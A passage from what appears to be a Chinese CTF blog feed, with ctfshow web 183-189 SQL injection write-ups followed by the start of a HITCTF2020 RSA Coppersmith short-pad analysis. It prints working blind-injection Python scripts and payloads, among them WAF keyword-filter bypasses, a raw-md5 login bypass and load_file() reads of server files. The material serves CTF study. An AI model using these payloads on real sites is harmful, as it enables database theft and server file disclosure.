class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接sql语句查找指定ID用户</span><br><span class="line">  $sql &#x3D; &quot;select count(pass) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\&#x3D;|or|\x7c|select|and|flag|into&#x2F;i&#39;, $str);</span><br><span class="line">  &#125;      </span><br></pre></td></tr></table></figure><p>查询结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;返回用户表的记录总数</span><br><span class="line">      $user_count &#x3D; 1;</span><br></pre></td></tr></table></figure><p>结果只会返回结果的数量, 而且过滤掉了很多关键字. 看了下视频, 这里要用到正则+盲注, sql中的正则是用REGEXP’str’来匹配的, 例如<code>select id from table where username REGXEP&#39;admin&#39;</code> 就会查询符合正则式子的username字段的那一行</p><p>这里因为可以知道结果有几行, 也就意味着可以判断正则是否匹配, 由前面的题目可以知道flag的格式是ctfshow{xxxx-xxx-x-x-x}这种, 而且只有小写字母和数字, 所以考虑用脚本盲注, 从<code>`ctfshow_user`where`pass`REGEXP&#39;ctfshow&#123;</code>开始猜flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://aba2e256-aa5c-4cf3-849f-b4f6d61fb78d.chall.ctf.show:8080/select-waf.php&#x27;</span></span><br><span class="line">Str = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;`ctfshow_user`where`pass`REGEXP&#x27;ctfshow&#123;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Str:</span><br><span class="line">        Data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: data[<span class="string">&#x27;tableName&#x27;</span>] + i + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=Data)</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">&#x27;\$user_count = (\d)&#x27;</span>,resp.content.decode())[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            data[<span class="string">&#x27;tableName&#x27;</span>] += i</span><br><span class="line">            print(re.findall(<span class="string">&#x27;\$user_count = (\d)&#x27;</span>,resp.content.decode())[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>跑完就得到flag了</p><h2 id="web-184"><a href="#web-184" class="headerlink" title="web 184"></a>web 184</h2><p>查询语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接sql语句查找指定ID用户</span><br><span class="line">  $sql &#x3D; &quot;select count(*) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;;    </span><br></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>查询结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;返回用户表的记录总数</span><br><span class="line">      $user_count &#x3D; 0;</span><br></pre></td></tr></table></figure><p>这题连<code>where</code>都过滤掉了, 还剩下一个可以用来设定条件的<code>on</code>, 如果要用<code>on</code>的, 需要用到多表联合查询<code>JOIN</code>, 在两个表(依旧是同一个表)中查询, 生成的临时表中就可以用on</p><p>不管是<code>INNER JOIN</code>还是<code>LEFT JOIN</code>或者是<code>RIGHT JOIN</code>都无所谓, 只需要猜flag正确的时候回显不同即可,  因为这题没有过滤掉空格, 构造payload:<code>tableName=ctfshow_user as a inner join ctfshow_user as b on substr(b.pass,num,1)regexp(char(str))</code>, 其中num就是flag的位数, str就是猜测的字符 , 因为知道flag前缀是<code>ctfshow&#123;</code>, 所以从第9位开始猜就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://87deffe2-4291-41ac-b76b-1bcaf046e697.chall.ctf.show:8080/select-waf.php&#x27;</span></span><br><span class="line">Str = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on substr(b.pass,&#123;&#125;,1)regexp(char(&#123;&#125;))&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">num = <span class="number">9</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Str:</span><br><span class="line">        Data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: data[<span class="string">&#x27;tableName&#x27;</span>].<span class="built_in">format</span>(num, <span class="built_in">ord</span>(i))</span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=Data)</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">&#x27;\$user_count = (\d*)&#x27;</span>, resp.content.decode())[<span class="number">0</span>] == <span class="string">&#x27;43&#x27;</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="web-185-186"><a href="#web-185-186" class="headerlink" title="web 185  186"></a>web 185  186</h2><p>在184的基础上过滤掉了数字, 也就是说payload里面不能出现数字, 可以用true+true+true….来构造想要的数字, 如99就是99个true相加, 利用这个继续写脚本得到flag</p><p>从Y4博客找到一张图<br><img src="http://47.98.130.190:8090/upload/2021/03/web185-5aed31977bec4fea8a5db59a746da244.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://2f2306e9-b139-4243-b9be-ff87dacd631c.chall.ctf.show:8080/select-waf.php&#x27;</span></span><br><span class="line">Str = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on substr(b.pass,&#123;&#125;,true)regexp(char(&#123;&#125;))&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">num = <span class="number">9</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Str:</span><br><span class="line">        Data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: data[<span class="string">&#x27;tableName&#x27;</span>].<span class="built_in">format</span>((num*<span class="string">&#x27;true+&#x27;</span>)[:-<span class="number">1</span>], (<span class="built_in">ord</span>(i)*<span class="string">&#x27;true+&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=Data)</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">&#x27;\$user_count = (\d*)&#x27;</span>, resp.content.decode())[<span class="number">0</span>] == <span class="string">&#x27;43&#x27;</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="web-187"><a href="#web-187" class="headerlink" title="web 187"></a>web 187</h2><p>以前做过的<code>md5($password,true) </code> 可以去看看 jarvis oj - login, 一个很神奇的字符串<code>ffifdyop</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_user where username = <span class="subst">$_POST</span>[&#x27;username&#x27;] and password= md5(<span class="subst">$_POST</span>[&#x27;password&#x27;],true)&quot;</span>; </span><br></pre></td></tr></table></figure><p><code>md5(&#39;ffifdyop&#39;,true) = &quot;&#39;or&#39;6xxxxxxx&quot;</code></p><h2 id="web-188"><a href="#web-188" class="headerlink" title="web 188"></a>web 188</h2><p>先pass , 有点奇怪</p><h2 id="web-189"><a href="#web-189" class="headerlink" title="web 189"></a>web 189</h2><p>查询语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用户名检测</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>hint: flag在api/index.php文件中</p><p>学习到了一些sql注入可能用到的函数:</p><ol><li><code>if(exp1,exp2,exp3)</code>, 当<code>exp1</code>为<code>TRUE</code>时函数返回<code>exp2</code>, 反之返回<code>exp3</code>, 可搭配一些字符串比较函数来进行<strong>盲注</strong></li><li><code>load_file(file_name)</code>, 读取一个文件并将其内容作为字符串返回, 用于读取外部文件</li><li><code>locate(substr,str)</code>, 返回字符串<code>str</code>第一次出现子串<code>substr</code>的位置</li><li><code>strcmp(str1,str2)</code>,如果这两个字符串相等返回0，如果第一个参数是根据当前的排序顺序比第二较小则返回-1，否则返回1</li></ol><p>hint已经告诉了我们flag在文件index.php中, 要在sql中读取文件, 可以使用<code>load_file()</code>, 所以要在<code>username =&#123;$username&#125;</code>处执行<code>load_file()</code>且判断出flag是啥.</p><p>注意到<code>$username</code>没有被引号包着, 所以如果<code>$username</code>是语句是可以执行的.</p><p>这里要用<code>if()</code>和一些字符串你处理的函数来对flag进行盲注. </p><p>当<code>username=1&amp;password=0</code>时返回的是查询失败而当<code>username=0&amp;password=0</code>时返回的是密码错误, 可以根据这个回显来对flag进行判断.</p><p>首先, 先找到flag在文件中的位置, 因为前缀是ctfshow{ ,所以根据这个来找到flag的位置.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findindex</span>():</span></span><br><span class="line">    Index = <span class="number">1</span></span><br><span class="line">    url = <span class="string">&#x27;http://67064451-541b-444f-8c0e-c71be0d43b7f.chall.ctf.show:8080/api/&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(locate(&#x27;ctfshow&#123;&#x27;,&quot;</span> + <span class="string">&quot;load_file(&#x27;/var/www/html/api/index.php&#x27;))&gt;&#123;&#125;,0,1)&quot;</span>.<span class="built_in">format</span>(Index),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> resp.content.decode():</span><br><span class="line">            Index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Index + <span class="number">8</span></span><br></pre></td></tr></table></figure><p>然后根据上面得到的flag的起始位置开始猜flag, 最终脚本为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://67064451-541b-444f-8c0e-c71be0d43b7f.chall.ctf.show:8080/api/&#x27;</span></span><br><span class="line">Str = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findindex</span>():</span></span><br><span class="line">    Index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(locate(&#x27;ctfshow&#123;&#x27;,&quot;</span> + <span class="string">&quot;load_file(&#x27;/var/www/html/api/index.php&#x27;))&gt;&#123;&#125;,0,1)&quot;</span>.<span class="built_in">format</span>(Index),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> resp.content.decode():</span><br><span class="line">            Index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Index + <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Index = findindex()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(strcmp(&#x27;&#123;&#125;&#x27;,substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1))=0,0,1)&quot;</span>.<span class="built_in">format</span>(i, Index),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> resp.content.decode():</span><br><span class="line">            flag += i</span><br><span class="line">            Index += <span class="number">1</span></span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;重金买了个号怎么可能不做呢???&lt;br&gt;好好学学Web了 真的很重要!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;信息搜集-Web1-20&quot;&gt;&lt;a href=&quot;#信息搜集-Web1-20&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    <category term="WebSummary" scheme="http://tearsjin.github.io/categories/WebSummary/"/>
    
    
    <category term="Web" scheme="http://tearsjin.github.io/tags/Web/"/>
    
    <category term="Summary" scheme="http://tearsjin.github.io/tags/Summary/"/>
    
    <category term="ctfshow" scheme="http://tearsjin.github.io/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>HITCTF2020 ezRSA - The learing or Coppersmith attack</title>
    <link href="http://tearsjin.github.io/2020/12/10/HITCTF2020-ezRSA-The-learing-or-Coppers/"/>
    <id>http://tearsjin.github.io/2020/12/10/HITCTF2020-ezRSA-The-learing-or-Coppers/</id>
    <published>2020-12-10T03:49:56.000Z</published>
    <updated>2021-03-13T03:34:43.892Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>关于出去玩只能在手机上用Sage Cell Server做题那件事<br>也是好久没写博客了, 刚好学习一下coppersmith attack</p></blockquote><p>先把题目放上来吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /bin/bash python2</span></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = flag+os.urandom(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line"></span><br><span class="line">m1 = bytes_to_long(flag)</span><br><span class="line">m2 = bytes_to_long(flag+os.urandom(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(m1,<span class="number">3</span>) &gt; n</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1,e,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;c1 = %d&quot;</span>%c1</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;c2 = %d&quot;</span>%c2</span><br><span class="line"><span class="built_in">print</span>  <span class="string">&quot;n = %d&quot;</span>%n</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c1 = 80653989110793139102855968265870741534421660712327094406252902072101613222389965470648960909763762225046314865847982289607336162281576790259047039000290839621007818742162307587677505606906923990312494483089046762906753345262127057162580025978324312642501118741099945205580088180943278903718853065363662232083</span></span><br><span class="line"><span class="string">c2 = 5400424653941721880728309040044485787870754570249463205700803061685717472238274158687499478247752712211743180931379853481727502849946080245130393042405383007613277703993980940893569303012323853427216643473698166348237252515222556282004058588218846910754415888401275689026778751805826968590155607937830708498</span></span><br><span class="line"><span class="string">n = 92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338861040226250478895118923994109662815448681629315227440953320952623296140315432654804940766553284237954507627610922864055435652884184926768295740697589798180602153344302964255974935777945481843144629875127</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>做这个之前, 先来看看coppersmith attack(直接翻CTF wiki</p><p><img src="http://47.98.130.190:8090/upload/2020/12/%E5%9B%BE%E7%89%87-586a877790ff4bc2b6343a9dcc51fb52.png" alt="图片.png"></p><p>对于单变量的方程(多变量的还没接触过, 能否使用coppersmith attack 就看变量是否满足上面这部分所提到的约束.</p><p>来分析一下这些约束, 对于一般的RSA列出模N意义下的多项式方程求解根的时候, 因为N往往是两个大素数的乘积, <strong>那么N必定会有一个因子 $b$ 是满足 $b &gt; N^{0.5}$ 的, 所以一般 $β$ 是取0.4~0.6的</strong></p><p><strong>但是有需要注意的是, 有时候求解根并不是在模N的意义下进行的, 这个时候就需要慎重的考虑一下$β$的取值了</strong></p><p>而对于 $δ$ , 也就是多项式的阶数, 阶数越小对根的约束就越宽松, 这也就是为什么CTF wiki上会有这么一句<br><img src="http://47.98.130.190:8090/upload/2020/12/%E5%9B%BE%E7%89%87-2ab4f8c151f8487bb406b1f35bd879c8.png" alt="图片.png"></p><p>所以, 判断是否可以使用coppersmith attack, 就看需要解的根是否足够小(一般通过题目所给的信息来判断根的位数, 再通过e 和 N 的位数,来判断是否可以使用coppersmith attack </p><p><strong>需要注意的是!由于LLL是启发式算法, 所以有的时候解出来的根会不满足约束, 也就是说当需要解的根近乎足够小就可以试试coppersmith了</strong></p><p>现在回到题目, 先来分析一下题目</p><p>这题先对flag进行了一次填充<code>flag = flag+os.urandom(32)</code>, 如果flag太小是可能直接解出来的.</p><p>然后就是对明文进行加密,再进行一次填充再加密, 写成式子就是<br>$$<br>m^3 = c_1 \ (mod \ n) \<br>(2^{64}m + diff)^3 = c_2 \ (mod \ n )<br>$$</p><p>其实可以令M=2^64^m 和 $c_1 = 2^{192}c_1$, 就可以有<br>$$<br>M^3 = c_1 \ (mod \ n) \<br>(M + diff)^3 = c_2 \ (mod \ n)<br>$$<br>两个方程, 两个未知数, 肯定是可以解出根来的, 只不过是难不难解出来的问题了. 注意到这里的$diff$ 是64位的, 而$N$是1024位的, e=3也很小, 可以考虑试试coppersmith先解出$diff$. </p><p>事实上解$diff$用到的就是<strong>Coppersmith’s short-pad attack</strong></p><h2 id="Coppersmith’s-short-pad-attack"><a href="#Coppersmith’s-short-pad-attack" class="headerlink" title="Coppersmith’s short-pad attack"></a>Coppersmith’s short-pad attack</h2><p><img src="http://47.98.130.190:8090/upload/2020/12/%E5%9B%BE%E7%89%87-d485fe72d1cf494dadf262039448ace2.png" alt="图片.png"></p><p>wiki上说的也很清楚了, 在对明文进行填充的时候, 如果填充的$diff$位数很少,就可以算出$diff$,只需要$diff &lt; N^{1/e}$, 就可以解出$diff$了. 在这里显然是满足的.</p><p>我们先把两个方程化成只有一个未知数$diff$的方程(代码里diff = xn ,<br>然后用<code>small_root()</code>求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">C1 = <span class="number">80653989110793139102855968265870741534421660712327094406252902072101613222389965470648960909763762225046314865847982289607336162281576790259047039000290839621007818742162307587677505606906923990312494483089046762906753345262127057162580025978324312642501118741099945205580088180943278903718853065363662232083</span></span><br><span class="line">C2 = <span class="number">5400424653941721880728309040044485787870754570249463205700803061685717472238274158687499478247752712211743180931379853481727502849946080245130393042405383007613277703993980940893569303012323853427216643473698166348237252515222556282004058588218846910754415888401275689026778751805826968590155607937830708498</span></span><br><span class="line">n = <span class="number">92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338861040226250478895118923994109662815448681629315227440953320952623296140315432654804940766553284237954507627610922864055435652884184926768295740697589798180602153344302964255974935777945481843144629875127</span></span><br><span class="line">C1=(C1*<span class="number">2</span>**<span class="number">192</span>)%n</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">n1 = n</span><br><span class="line">PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n1))</span><br><span class="line">PRx.&lt;xn&gt; = PolynomialRing(Zmod(n1))</span><br><span class="line">PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n1))</span><br><span class="line"> </span><br><span class="line">g1 = x**e - C1</span><br><span class="line">g2 = (x + y)**e 